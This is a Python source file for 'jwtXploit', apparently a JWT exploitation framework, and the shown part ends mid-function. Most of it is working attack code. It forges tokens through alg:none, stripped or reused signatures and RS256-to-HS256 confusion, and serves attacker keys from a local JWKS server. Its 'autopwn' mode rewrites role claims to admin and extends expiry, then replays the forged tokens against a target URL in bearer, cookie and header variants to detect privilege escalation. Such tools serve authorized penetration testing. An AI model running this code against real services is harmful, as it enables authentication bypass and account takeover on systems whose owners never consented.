#!/usr/bin/env python3

import jwt
import base64
import argparse
import json
import requests
import os
import sys
import subprocess
import re
import time
import datetime
import threading
import socket
import http.server
import tempfile
from concurrent.futures import ThreadPoolExecutor, as_completed
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
from colorama import init, Fore, Style

init(autoreset=True)

# Global config — populated from CLI args in main()
CONFIG = {
    "proxy":          None,   # e.g. "http://127.0.0.1:8080"
    "ssl_verify":     True,   # set False with --no-ssl-verify
    "timeout":        10,     # seconds, overridden by --timeout
    "original_token": None,   # raw token from argv — used for baseline
    "autopwn":        False,  # --autopwn: run all attacks non-interactively
    "escalate_role":  None,   # --escalate-role: auto-set privilege claims to this value
    "strip_exp":      False,  # --strip-exp: remove nbf/iat and extend exp before signing
    "use_hashcat":    False,  # --hashcat: use GPU hashcat instead of Python threaded BF
    "output_file":    None,   # -o: path to save the report
    "output_format":  "json", # --format: json | txt | md
    "findings":       [],     # accumulated findings for the report
}


def gold_gradient_text(text):
    # 256-color codes for a goldish gradient (orange to yellow)
    gold_colors = [202, 208, 214, 220, 226]  # from dark orange to bright yellow
    gradient_text = ""
    length = len(text)
    for i, ch in enumerate(text):
        if ch == " ":
            gradient_text += ch
        else:
            # cycle through gold_colors based on position
            color_code = gold_colors[(i * len(gold_colors)) // length]
            gradient_text += f"\033[38;5;{color_code}m{ch}"
    gradient_text += Style.RESET_ALL
    return gradient_text

def print_banner():
    logo = """
       ___       ________  _  __       ______  _ ______
      / / |     / /_  __/ | |/ /____  / / __ \\(_)_  __/
 __  / /| | /| / / / /    |   // __ \\/ / / / / / / /   
/ /_/ / | |/ |/ / / /    /   |/ /_/ / / /_/ / / / /    
\\____/  |__/|__/ /_/____/_/|_/ .___/_/\\____/_/ /_/     
                            /_/                        
"""
    print(gold_gradient_text(logo))

    print(f"""{Fore.YELLOW}{Style.BRIGHT}  🔐 jwtXpl0iT - JWT Exploitation Framework
{Fore.CYAN}   👨‍💻 Developer: {Style.BRIGHT}Shoaib Bin Rashid {Style.NORMAL}(aka {Fore.RED}{Style.BRIGHT}R3D_XplOiT{Fore.CYAN})
{Fore.GREEN}    📎 GitHub: {Style.BRIGHT}{Fore.GREEN}https://github.com/Shoaib-Bin-Rashid/Pentest-Automated-Tools/Web/jwtXploit
{Style.RESET_ALL}
""")


def pad_b64(b64_str):
    return b64_str + '=' * (-len(b64_str) % 4)

def decode_token(token):
    try:
        return jwt.decode(token, options={"verify_signature": False})
    except Exception as e:
        print(f"[!] Error decoding payload: {e}")
        return {}

def get_header(token):
    try:
        return jwt.get_unverified_header(token)
    except Exception as e:
        print(f"[!] Error decoding header: {e}")
        return {}


# ──────────────────────────────────────────────────────────────
#  PHASE 2 HELPERS
# ──────────────────────────────────────────────────────────────

def apply_exp_strip(payload):
    """Remove nbf/iat and push exp 10 years forward when --strip-exp is active."""
    if not CONFIG.get("strip_exp"):
        return payload
    p = dict(payload)
    p.pop("nbf", None)
    p.pop("iat", None)
    p["exp"] = int(time.time()) + (10 * 365 * 24 * 3600)
    print(Fore.YELLOW + "[--strip-exp] Removed nbf/iat  |  exp pushed → 10 years from now")
    return p


def scan_token_secrets(token):
    """Scan the decoded JWT payload for embedded sensitive data and warn the user."""
    decoded = decode_token(token)
    if not decoded:
        return
    payload_str = json.dumps(decoded)
    patterns = {
        "AWS Access Key":  r"AKIA[0-9A-Z]{16}",
        "PEM Private Key": r"-----BEGIN.{0,30}PRIVATE KEY-----",
        "Password field":  r'"pass(?:word|wd)?"\s*:\s*"[^"]{3,}"',
        "API Key field":   r'"api[_\-]?key"\s*:\s*"[^"]{6,}"',
        "Secret field":    r'"secret"\s*:\s*"[^"]{3,}"',
        "Email address":   r'[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}',
        "Private IP":      r'\b(?:10\.|172\.(?:1[6-9]|2\d|3[01])\.|192\.168\.)\d{1,3}\.\d{1,3}\b',
    }
    found = [label for label, pat in patterns.items()
             if re.search(pat, payload_str, re.IGNORECASE)]
    if found:
        print(Fore.RED + Style.BRIGHT + "\n⚠️   EMBEDDED SECRETS DETECTED IN TOKEN PAYLOAD:")
        for item in found:
            print(Fore.RED + f"     ▸ {item}")
        print(Fore.RED + "     Handle this token carefully!\n")


def manual_none_token(header_dict, payload_dict):
    """Manually encode a JWT with an arbitrary alg string and no signature."""
    h = base64.urlsafe_b64encode(
        json.dumps(header_dict, separators=(",", ":")).encode()
    ).rstrip(b'=').decode()
    p = base64.urlsafe_b64encode(
        json.dumps(payload_dict, separators=(",", ":")).encode()
    ).rstrip(b'=').decode()
    return f"{h}.{p}."


# ──────────────────────────────────────────────────────────────
#  PHASE 3 HELPERS
# ──────────────────────────────────────────────────────────────

def find_free_port(preferred=8888):
    """Return preferred port if free, otherwise let OS assign one."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.bind(("0.0.0.0", preferred))
            return preferred
        except OSError:
            s.bind(("0.0.0.0", 0))
            return s.getsockname()[1]


def get_lan_ip():
    """Detect the machine's LAN IP (works even without internet)."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"


def start_jwks_server(jwks_data, port=8888):
    """
    Spin up a lightweight HTTP server (stdlib only) to serve JWKS JSON.
    Responds to ANY GET path with the JWKS — handles both / and /.well-known/jwks.json.
    Returns the running HTTPServer instance (caller must call .shutdown() when done).
    """
    jwks_bytes = json.dumps(jwks_data).encode()

    class JWKSHandler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(jwks_bytes)

        def log_message(self, fmt, *args):
            pass  # silence request logs — keep terminal clean

    server = http.server.HTTPServer(("0.0.0.0", port), JWKSHandler)
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()
    return server


# ──────────────────────────────────────────────────────────────
#  PHASE 4 — CVE MAP, RECOMMENDER, DECODE MODE, REPORTING
# ──────────────────────────────────────────────────────────────

# Map internal attack keys → (CVE, CVSS, short description)
CVE_MAP = {
    "unverified":     ("CVE-2015-9235",  "9.8", "Signature not verified — library accepts tampered tokens"),
    "alg_none":       ("CVE-2015-9235",  "9.8", "alg:none accepted — no signature required"),
    "algo_confusion": ("CVE-2016-5431",  "9.1", "RS256 → HS256 algorithm confusion attack"),
    "jwk_inject":     ("CVE-2018-0114",  "9.8", "JWK self-signed header injection"),
    "jku_inject":     ("CVE-2018-0114",  "9.8", "JKU header injection — attacker-hosted key set"),
    "psychic_sig":    ("CVE-2022-21449", "9.8", "Java ECDSA Psychic Signature — zero-value r/s bypass"),
    "kid_traversal":  ("N/A",            "8.2", "KID path traversal — empty key via /dev/null"),
    "kid_sqli":       ("N/A",            "9.1", "KID SQL injection — UNION SELECT controls signing key"),
    "kid_ssrf":       ("N/A",            "8.6", "KID SSRF — server fetches key from attacker-controlled URL"),
    "null_sig":       ("N/A",            "7.5", "Null/stripped signature accepted by JWT library"),
    "weak_key":       ("N/A",            "8.8", "Weak or guessable HMAC signing secret"),
}

# Maps attack name substrings → CVE_MAP keys (for print_result lookup)
_ATTACK_CVE_KEYS = {
    "unverified signature":   "unverified",
    "alg:none":               "alg_none",
    "alg:":                   "alg_none",
    "algorithm confusion":    "algo_confusion",
    "jwk header":             "jwk_inject",
    "jku header":             "jku_inject",
    "psychic signature":      "psychic_sig",
    "kid path traversal":     "kid_traversal",
    "kid sqli":               "kid_sqli",
    "kid sql":                "kid_sqli",
    "kid ssrf":               "kid_ssrf",
    "null signature":         "null_sig",
    "weak signing":           "weak_key",
}


def _cve_for_attack(attack_name):
    """Return (cve_id, cvss, desc) for a given attack name string, or None."""
    name_lower = attack_name.lower()
    for substr, cve_key in _ATTACK_CVE_KEYS.items():
        if substr in name_lower:
            return CVE_MAP.get(cve_key)
    return None


def recommend_attacks(header, payload):
    """Analyse the token header/payload and print ranked attack suggestions."""
    alg  = header.get("alg", "").upper()
    tips = []

    if alg in ("RS256", "RS384", "RS512", "PS256", "PS384", "PS512"):
        tips.append(("CRITICAL", "→ #7  Algorithm Confusion  (RS/PS alg detected — try public key as HMAC secret)"))
    if alg in ("ES256", "ES384", "ES512"):
        tips.append(("CRITICAL", "→ #8  ES256 Psychic Signature  (CVE-2022-21449 — zero r/s bypass)"))
        tips.append(("HIGH",     "→ #7  Algorithm Confusion  (EC alg — worth trying)"))
    if "jku" in header:
        tips.append(("CRITICAL", "→ #5  JKU Injection  (jku header present — replace with your JWKS server)"))
    if "jwk" in header:
        tips.append(("CRITICAL", "→ #4  JWK Injection  (embedded JWK — replace with attacker key)"))
    if "kid" in header:
        tips.append(("HIGH",     "→ #6  KID Path Traversal  (kid header present)"))
        tips.append(("HIGH",     "→ #10 KID SQL Injection  (if kid queries a database)"))
        tips.append(("HIGH",     "→ #11 KID SSRF  (if kid is fetched as a URL)"))
    if alg in ("HS256", "HS384", "HS512"):
        tips.append(("HIGH",     "→ #3  Weak Key Brute Force  (HMAC — try rockyou / jwt-secrets wordlist)"))
    tips.append(("MEDIUM",   "→ #2  alg:none  (7 case variants — always worth a shot)"))
    tips.append(("MEDIUM",   "→ #9  Null Signature  (some libs skip sig check entirely)"))
    tips.append(("LOW",      "→ #1  Unverified Signature  (swap payload, keep original sig)"))

    exp = payload.get("exp")
    if exp and exp < int(time.time()):
        tips.append(("INFO",   "Token is expired — add --strip-exp to extend before attacking"))
    if not exp:
        tips.append(("INFO",   "No exp claim — replay freely, no time restriction"))

    sev_color = {"CRITICAL": Fore.RED, "HIGH": Fore.YELLOW,
                 "MEDIUM": Fore.CYAN,  "LOW": Fore.WHITE, "INFO": Fore.GREEN}

    print(Fore.CYAN + "\n  ⚡ RECOMMENDED ATTACKS (ranked by likelihood):")
    for sev, msg in tips:
        print(sev_color.get(sev, Fore.WHITE) + f"    [{sev:8}]  {msg}")


def decode_mode(token):
    """--decode: full recon of a JWT without attacking anything."""
    header  = get_header(token)
    payload = decode_token(token)
    now     = int(time.time())

    print(Fore.CYAN + "\n" + "═" * 62)
    print(Fore.CYAN + "  🔍  TOKEN RECON")
    print(Fore.CYAN + "═" * 62)

    print(Fore.YELLOW + f"\n  ALGORITHM  : {header.get('alg', 'unknown')}")
    print(Fore.YELLOW + f"  TYPE       : {header.get('typ', 'JWT')}")

    if "kid" in header:
        print(Fore.RED    + f"  KID        : {header['kid']}  ← potential SQLi / traversal / SSRF")
    if "jku" in header:
        print(Fore.RED    + f"  JKU        : {header['jku']}  ← JKU injection surface!")
    if "jwk" in header:
        print(Fore.RED    +  "  JWK        : embedded  ← JWK injection surface!")

    exp = payload.get("exp")
    if exp:
        exp_dt = datetime.datetime.fromtimestamp(exp).strftime("%Y-%m-%d %H:%M:%S")
        if exp < now:
            diff = now - exp
            h, m = divmod(diff // 60, 60)
            print(Fore.RED   + f"  EXPIRY     : ⚠️  EXPIRED {h}h {m}m ago  ({exp_dt})")
        else:
            diff = exp - now
            h, m = divmod(diff // 60, 60)
            print(Fore.GREEN + f"  EXPIRY     : ✅ Valid — expires in {h}h {m}m  ({exp_dt})")
    else:
        print(Fore.RED   +  "  EXPIRY     : ⚠️  No exp claim — token never expires")

    for claim_key in ("nbf", "iat"):
        if claim_key in payload:
            ts = datetime.datetime.fromtimestamp(payload[claim_key]).strftime("%Y-%m-%d %H:%M:%S")
            label = "NOT BEFORE" if claim_key == "nbf" else "ISSUED AT "
            print(Fore.YELLOW + f"  {label}  : {ts}")

    interesting = {k: v for k, v in payload.items() if k not in ("exp", "nbf", "iat")}
    if interesting:
        print(Fore.YELLOW + "\n  CLAIMS:")
        for k, v in interesting.items():
            print(Fore.YELLOW + f"    {k:20} = {v}")

    recommend_attacks(header, payload)
    print(Fore.CYAN + "\n" + "═" * 62 + "\n")


def save_report(output_file, fmt):
    """Write accumulated findings to disk in json / txt / md format."""
    findings = CONFIG.get("findings", [])
    confirmed = [f for f in findings if f.get("verified")]

    if not findings:
        print(Fore.YELLOW + "[*] No findings to save (no attacks ran or no tokens generated).")
        return

    target = (CONFIG.get("original_token") or "unknown")[:30] + "..."
    ts     = time.strftime("%Y-%m-%d %H:%M:%S")

    # ── JSON ──────────────────────────────────────────────────
    if fmt == "json":
        data = {
            "tool":      "jwtXploit",
            "generated": ts,
            "token_preview": target,
            "stats": {
                "total_generated": len(findings),
                "confirmed_accepted": len(confirmed),
            },
            "findings": findings,
        }
        content = json.dumps(data, indent=4, default=str)

    # ── TXT ───────────────────────────────────────────────────
    elif fmt == "txt":
        lines = [
            "jwtXploit — Pentest Report",
            f"Generated : {ts}",
            f"Tokens    : {len(findings)} generated  |  {len(confirmed)} confirmed accepted",
            "=" * 62,
        ]
        for i, f in enumerate(findings, 1):
            status = "✅ ACCEPTED" if f.get("verified") else "   generated"
            lines.append(f"\n[{i}] {f['attack']}  [{status}]")
            lines.append(f"    Token   : {f['token'][:80]}...")
            if f.get("verify_reason"):
                lines.append(f"    Reason  : {f['verify_reason']}")
            if f.get("delivery"):
                lines.append(f"    Via     : {f['delivery']}")
        content = "\n".join(lines)

    # ── Markdown ──────────────────────────────────────────────
    elif fmt == "md":
        lines = [
            "# JWT Vulnerability Report",
            f"**Tool:** jwtXploit &nbsp;|&nbsp; **Date:** {ts}",
            "",
            "## Executive Summary",
            f"| Metric | Value |",
            f"|--------|-------|",
            f"| Tokens Generated | {len(findings)} |",
            f"| Confirmed Accepted | **{len(confirmed)}** |",
            "",
            "## Confirmed Findings",
        ]
        if confirmed:
            for f in confirmed:
                cve_info = _cve_for_attack(f["attack"])
                cve_str  = f"{cve_info[0]} (CVSS {cve_info[1]}) — {cve_info[2]}" if cve_info else "N/A"
                lines += [
                    f"### {f['attack']}",
                    f"| Field | Detail |",
                    f"|-------|--------|",
                    f"| CVE / Reference | `{cve_str}` |",
                    f"| Accepted Via | {f.get('delivery', 'N/A')} |",
                    f"| Detection Reason | {f.get('verify_reason', 'N/A')} |",
                    "",
                    "**Forged Token:**",
                    f"```\n{f['token']}\n```",
                    "",
                    "**Modified Payload:**",
                    f"```json\n{json.dumps(f.get('payload', {}), indent=2)}\n```",
                    "",
                    "**Remediation:** Validate the JWT signature server-side with a "
                    "well-maintained library. Enforce a strict algorithm allowlist "
                    "and never trust header-supplied keys.",
                    "",
                ]
        else:
            lines.append("_No tokens were confirmed accepted during this scan._")

        lines += [
            "",
            "## All Generated Tokens",
            "| # | Attack | Status |",
            "|---|--------|--------|",
        ]
        for i, f in enumerate(findings, 1):
            status = "✅ Accepted" if f.get("verified") else "⚪ Generated"
            lines.append(f"| {i} | {f['attack']} | {status} |")

        content = "\n".join(lines)
    else:
        print(Fore.RED + f"[!] Unknown format '{fmt}' — use json, txt, or md.")
        return

    try:
        with open(output_file, "w", encoding="utf-8") as fp:
            fp.write(content)
        print(Fore.GREEN + f"\n[+] 📄 Report saved → {output_file}  (format: {fmt})")
        print(Fore.GREEN + f"[+] {len(findings)} tokens generated  |  {len(confirmed)} confirmed accepted")
    except Exception as e:
        print(Fore.RED + f"[!] Could not save report: {e}")

def interactive_edit_dict(title, d):
    # AUTOPWN MODE — skip all interaction; optionally escalate role-related claims
    if CONFIG.get("autopwn"):
        role = CONFIG.get("escalate_role")
        if role:
            escalation_fields = {
                "role", "user", "sub", "admin", "administrator",
                "isAdmin", "is_admin", "scope", "permissions", "username",
            }
            for k in list(d.keys()):
                if k in escalation_fields:
                    d[k] = role
                    print(Fore.YELLOW + f"[AUTOPWN] Auto-set '{k}' → '{role}'")
        return apply_exp_strip(d)

    # Define relevant fields for default options
    relevant_fields = {"exp", "user", "role", "sub", "admin", "administrator", "isAdmin", "is_admin", "scope", "permissions","username"}
    default_options = ["admin", "administrator", "user", "true", "false", "Other"]

    while True:
        print(Fore.YELLOW + f"\n{title} values:")
        keys = list(d.keys())
        for i, key in enumerate(keys, 1):
            print(Fore.YELLOW + f"[{i}] {key} = " + Fore.CYAN + f"\"{d[key]}\"")
        print()
        print(Fore.YELLOW + f"[{len(keys)+1}] *ADD A VALUE*")
        print(Fore.YELLOW + f"[{len(keys)+2}] *DELETE A VALUE*")
        print(Fore.YELLOW + "[0] Continue to next step")

        choice = input(Fore.CYAN + "Please select a field number:\n(or 0 or press Enter to Continue)\n> ").strip()
        if choice == "" or choice == "0":
            break
        if not choice.isdigit():
            print(Fore.RED + "[-] Invalid input, please enter a number.")
            continue
        choice = int(choice)

        if 1 <= choice <= len(keys):
            key = keys[choice - 1]
            # If key is relevant, show default options
            if key in relevant_fields:
                print(Fore.CYAN + f"Select a new value for relevant field '{key}':")
                for idx, option in enumerate(default_options, 1):
                    print(Fore.CYAN + f"[{idx}] {option}")
                val_choice = input(Fore.CYAN + "Choose an option number: ").strip()
                if not val_choice.isdigit() or not (1 <= int(val_choice) <= len(default_options)):
                    print(Fore.RED + "[-] Invalid choice, skipping...")
                    continue
                val_choice = int(val_choice)
                if val_choice == len(default_options):  # Other
                    new_val = input(Fore.CYAN + f"Enter custom value for '{key}': ")
                else:
                    new_val = default_options[val_choice - 1]
            else:
                # Non-relevant field, normal input prompt
                new_val = input(Fore.CYAN + f"Enter new value for '{key}': ")

            d[key] = new_val
            print(Fore.GREEN + f"[+] Key '{key}' updated to '{new_val}'.")
        elif choice == len(keys) + 1:  # Add a value
            new_key = input(Fore.CYAN + "Enter new field name: ").strip()
            if not new_key:
                print(Fore.RED + "[-] Field name cannot be empty.")
                continue
            if new_key in d:
                print(Fore.RED + "[-] Field already exists.")
                continue

            # If new key is relevant, show default options else normal input
            if new_key in relevant_fields:
                print(Fore.CYAN + f"Select a value for relevant field '{new_key}':")
                for idx, option in enumerate(default_options, 1):
                    print(Fore.CYAN + f"[{idx}] {option}")
                val_choice = input(Fore.CYAN + "Choose an option number: ").strip()
                if not val_choice.isdigit() or not (1 <= int(val_choice) <= len(default_options)):
                    print(Fore.RED + "[-] Invalid choice, skipping field addition...")
                    continue
                val_choice = int(val_choice)
                if val_choice == len(default_options):  # Other
                    new_val = input(Fore.CYAN + f"Enter custom value for '{new_key}': ")
                else:
                    new_val = default_options[val_choice - 1]
            else:
                new_val = input(Fore.CYAN + "Enter new value: ")

            d[new_key] = new_val
            print(Fore.GREEN + f"[+] Added new field '{new_key}'.")
        elif choice == len(keys) + 2:  # Delete a value
            del_choice = input(Fore.CYAN + "Enter the number of the field to delete: ").strip()
            if not del_choice.isdigit():
                print(Fore.RED + "[-] Invalid input.")
                continue
            del_choice = int(del_choice)
            if 1 <= del_choice <= len(keys):
                del_key = keys[del_choice - 1]
                del d[del_key]
                print(Fore.GREEN + f"[+] Key '{del_key}' deleted.")
            else:
                print(Fore.RED + "[-] Invalid field number.")
        else:
            print(Fore.RED + "[-] Invalid choice.")

    return apply_exp_strip(d)


def print_result(attack_name, token, payload, header):
    print(Fore.CYAN + f"\n[+] {attack_name}")

    # Show CVE reference if one exists for this attack
    cve = _cve_for_attack(attack_name)
    if cve:
        cve_id, cvss, desc = cve
        clr = Fore.RED if cve_id != "N/A" else Fore.YELLOW
        print(clr + f"    ↳ {cve_id}  CVSS:{cvss}  {desc}")

    print(Fore.GREEN  + "[*] Modified JWT Token:")
    print(Fore.GREEN  + token)
    print(Fore.YELLOW + "[*] Decoded Header:")
    print(Fore.YELLOW + json.dumps(header, indent=4))
    print(Fore.YELLOW + "[*] Modified Payload:")
    print(Fore.YELLOW + json.dumps(payload, indent=4))

    # Record every generated token for reporting
    CONFIG["findings"].append({
        "attack":    attack_name,
        "token":     token,
        "payload":   payload,
        "header":    header,
        "verified":  False,
        "verify_reason": None,
        "delivery":  None,
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
    })

def check_url(token, url=None):
    if not url:
        if CONFIG.get("autopwn"):
            print(Fore.YELLOW + "[AUTOPWN] No --url specified — skipping HTTP check for this token.")
            return
        print()
        url = input(Fore.YELLOW + "Enter URL endpoint to check if token works: ").strip()
        if not url:
            print(Fore.RED + "No URL provided. Skipping check.")
            return

    # HTTP method selection — autopwn defaults to GET silently
    methods = ["GET", "POST", "PUT", "DELETE", "PATCH"]
    if CONFIG.get("autopwn"):
        method = "GET"
    else:
        print(Fore.YELLOW + "\nSelect HTTP method:")
        for i, m in enumerate(methods, start=1):
            default_note = " (default)" if i == 1 else ""
            print(f"[{i}] {m}{default_note}")
        choice = input(Fore.CYAN + "Enter choice [1-5]: ").strip()
        if not choice:
            method = "GET"
        else:
            try:
                idx = int(choice)
                method = methods[idx - 1] if 1 <= idx <= len(methods) else "GET"
            except ValueError:
                method = "GET"
    print(Fore.MAGENTA + f"\n[>] Using HTTP Method: {method}")

    # Build session — respects --proxy, --no-ssl-verify, --timeout
    session = requests.Session()
    if CONFIG["proxy"]:
        session.proxies = {"http": CONFIG["proxy"], "https": CONFIG["proxy"]}
        print(Fore.YELLOW + f"[*] Routing via proxy: {CONFIG['proxy']}")
    session.verify = CONFIG["ssl_verify"]
    timeout = CONFIG["timeout"]

    # Smart baseline: send original token first so we can diff the forged response
    baseline_status = None
    baseline_body   = None
    orig = CONFIG.get("original_token")
    if orig and orig != token:
        try:
            b = session.request(
                method, url,
                headers={"Authorization": f"Bearer {orig}"},
                timeout=timeout
            )
            baseline_status = b.status_code
            baseline_body   = b.text
            print(Fore.CYAN + f"[BASELINE] Original token → HTTP {baseline_status} ({len(baseline_body)} bytes)")
        except Exception:
            pass

    # Keywords that indicate a privilege escalation in the response body
    PRIVILEGE_KW = [
        '"role":"admin"',   '"role": "admin"',
        '"isadmin":true',   '"isadmin": true',
        '"admin":true',     '"admin": true',
        '"elevated":true',  '"elevated": true',
        '"is_admin":true',  '"is_admin": true',
        '"superuser":true', '"superuser": true',
        'administrator',    'superadmin',
    ]

    def is_success(resp):
        """Compare forged response against baseline (if available) or use heuristics."""
        body_lower = resp.text.lower()
        if baseline_status is not None:
            # Status code changed → likely auth bypass
            if resp.status_code != baseline_status:
                return True, f"Status code changed: {baseline_status} → {resp.status_code}"
            # Body length changed by >15% → different data returned
            if baseline_body is not None:
                bl = len(baseline_body)
                if bl > 0 and abs(len(resp.text) - bl) / bl > 0.15:
                    return True, f"Response body size changed ({bl} → {len(resp.text)} bytes)"
            # New privilege keywords appeared that weren't in the baseline response
            bl_lower = baseline_body.lower() if baseline_body else ""
            for kw in PRIVILEGE_KW:
                if kw in body_lower and kw not in bl_lower:
                    return True, f"New privilege keyword detected: '{kw}'"
            return False, None
        else:
            # No baseline — fall back to HTTP 200 + keyword heuristic
            if resp.status_code == 200:
                for kw in PRIVILEGE_KW:
                    if kw in body_lower:
                        return True, f"HTTP 200 + privilege keyword: '{kw}'"
                return True, "HTTP 200 (run with --url on original token for smarter baseline detection)"
            return False, None

    # Delivery attempt 1: Authorization: Bearer <token>
    print(Fore.CYAN + f"[+] Testing  Authorization: Bearer  ({method})...")
    try:
        resp = session.request(method, url, headers={"Authorization": f"Bearer {token}"}, timeout=timeout)
        print(Fore.CYAN + f"[→] HTTP {resp.status_code} {resp.reason}")
        ok, reason = is_success(resp)
        if ok:
            print(Fore.GREEN + f"\n[+] ✅ TOKEN ACCEPTED!  Reason: {reason}")
            print_response_details(resp)
            print(Fore.GREEN + Style.BRIGHT + f"\n[*] Accepted JWT:\n{token}")
            if CONFIG["findings"]:
                CONFIG["findings"][-1]["verified"]      = True
                CONFIG["findings"][-1]["verify_reason"] = reason
                CONFIG["findings"][-1]["delivery"]      = "Authorization: Bearer"
            return
    except Exception as e:
        print(Fore.RED + f"[!] Request error (Bearer header): {e}")

    # Delivery attempt 2: Cookie variants
    for cookie_name in ["session", "jwt", "auth", "token"]:
        print(Fore.CYAN + f"[+] Testing  cookie '{cookie_name}'  ({method})...")
        try:
            resp = session.request(method, url, cookies={cookie_name: token}, timeout=timeout)
            print(Fore.CYAN + f"[→] HTTP {resp.status_code} {resp.reason}")
            ok, reason = is_success(resp)
            if ok:
                print(Fore.GREEN + f"\n[+] ✅ TOKEN ACCEPTED via cookie '{cookie_name}'!  Reason: {reason}")
                print_response_details(resp)
                print(Fore.GREEN + Style.BRIGHT + f"\n[*] Accepted JWT:\n{token}")
                if CONFIG["findings"]:
                    CONFIG["findings"][-1]["verified"]      = True
                    CONFIG["findings"][-1]["verify_reason"] = reason
                    CONFIG["findings"][-1]["delivery"]      = f"Cookie: {cookie_name}"
                return
        except Exception as e:
            print(Fore.RED + f"[!] Request error (cookie '{cookie_name}'): {e}")

    # Delivery attempt 3: custom header variants (frameworks, API gateways, proxies)
    HEADER_VARIANTS = [
        ("Authorization",   f"JWT {token}"),
        ("Authorization",   f"Token {token}"),
        ("X-Auth-Token",    token),
        ("X-Access-Token",  token),
        ("X-JWT-Assertion", token),
        ("X-Token",         token),
        ("x-api-key",       token),
        ("Api-Key",         token),
    ]
    for hdr_name, hdr_value in HEADER_VARIANTS:
        label = f"{hdr_name}: {hdr_value[:40]}..."
        print(Fore.CYAN + f"[+] Testing  {hdr_name}  ({method})...")
        try:
            resp = session.request(method, url, headers={hdr_name: hdr_value}, timeout=timeout)
            print(Fore.CYAN + f"[→] HTTP {resp.status_code} {resp.reason}")
            ok, reason = is_success(resp)
            if ok:
                print(Fore.GREEN + f"\n[+] ✅ TOKEN ACCEPTED via '{hdr_name}'!  Reason: {reason}")
                print_response_details(resp)
                print(Fore.GREEN + Style.BRIGHT + f"\n[*] Accepted JWT:\n{token}")
                if CONFIG["findings"]:
                    CONFIG["findings"][-1]["verified"]      = True
                    CONFIG["findings"][-1]["verify_reason"] = reason
                    CONFIG["findings"][-1]["delivery"]      = f"{hdr_name}"
                return
        except Exception as e:
            print(Fore.RED + f"[!] Request error ('{hdr_name}'): {e}")

    print(Fore.RED + "\n[!] Token not accepted via any tested delivery method.")


def print_response_details(response):
    print(Fore.CYAN + "[*] Response Headers:")
    for k, v in response.headers.items():
        print(Fore.GREEN +f"{k}: {v}")

    # Response cookies if any
    if response.cookies:
        print(Fore.CYAN + "[*] Response Cookies:")
        for cookie in response.cookies:
            print(f"{cookie.name}: {cookie.value}")

    print(Fore.CYAN + "[*] Response Body (first 500 chars):")
    text = response.text
    print(text[:1000] + ("..." if len(text) > 1000 else ""))

def generate_rsa_keypair():
    print(Fore.CYAN + "[*] Generating new RSA keypair...")

    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )

    with open("private_key.pem", "wb") as f:
        f.write(
            private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.NoEncryption()
            )
        )

    with open("public_key.pem", "wb") as f:
        f.write(
            private_key.public_key().public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo
            )
        )

    print(Fore.GREEN + "[+] Keys generated: 'private_key.pem' & 'public_key.pem'")
    return private_key

def manual_hs256_sign(header, payload, secret):
    """
    Manually sign a JWT with HS256 to bypass library restrictions (e.g. PyJWT blocking public keys as secrets).
    """
    import hmac
    import hashlib

    # Ensure alg is HS256 in header
    header["alg"] = "HS256"
    
    header_b64 = base64.urlsafe_b64encode(json.dumps(header, separators=(",", ":")).encode()).rstrip(b'=').decode()
    payload_b64 = base64.urlsafe_b64encode(json.dumps(payload, separators=(",", ":")).encode()).rstrip(b'=').decode()
    
    signing_input = f"{header_b64}.{payload_b64}".encode()
    
    # Handle secret: if it's a file path (like a PEM key), read bytes. If it's a string, use bytes.
    if isinstance(secret, str):
        if os.path.isfile(secret):
            with open(secret, "rb") as f:
                secret_bytes = f.read()
        else:
            secret_bytes = secret.encode()
    else:
        secret_bytes = secret

    signature = hmac.new(secret_bytes, signing_input, hashlib.sha256).digest()
    sig_b64 = base64.urlsafe_b64encode(signature).rstrip(b'=').decode()
    
    return f"{header_b64}.{payload_b64}.{sig_b64}"

def attack_null_signature(token, url=None):
    """
    Removes the signature but keeps the structure (header.payload.).
    Some libraries fail to check the signature if it's missing entirely.
    """
    decoded = decode_token(token)
    header = get_header(token)
    
    print(Fore.CYAN + "\n[+] Edit JWT Payload:")
    modified_payload = interactive_edit_dict("Token payload", decoded)
    
    # Re-encode without signing
    header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode()
    payload_b64 = base64.urlsafe_b64encode(json.dumps(modified_payload).encode()).rstrip(b'=').decode()
    
    modified_token = f"{header_b64}.{payload_b64}."
    
    print_result("Null Signature (Signature Stripping)", modified_token, modified_payload, header)
    check_url(modified_token, url)

def attack_unverified_signature(token, url=None):
    header_b64, payload_b64, signature = token.split('.')
    decoded_payload = json.loads(base64.urlsafe_b64decode(pad_b64(payload_b64)))
    decoded_header = get_header(token)
    
    print(Fore.CYAN + "\n[+] Edit JWT Header:")
    modified_header = interactive_edit_dict("Token header", decoded_header)
    
    print(Fore.CYAN + "\n[+] Edit JWT Payload:")
    modified_payload = interactive_edit_dict("Token payload", decoded_payload)

    # Re-encode payload
    modified_payload_b64 = base64.urlsafe_b64encode(json.dumps(modified_payload).encode()).rstrip(b'=').decode()
    modified_header_b64 = base64.urlsafe_b64encode(json.dumps(modified_header).encode()).rstrip(b'=').decode()
    modified_token = f"{modified_header_b64}.{modified_payload_b64}.{signature}"

    print_result("Unverified Signature", modified_token, modified_payload, modified_header)
    check_url(modified_token, url)

def attack_flawed_verification(token, url=None):
    decoded = decode_token(token)
    header  = dict(get_header(token))

    print(Fore.CYAN + "\n[+] Edit JWT Payload:")
    modified_payload = interactive_edit_dict("Token payload", decoded)

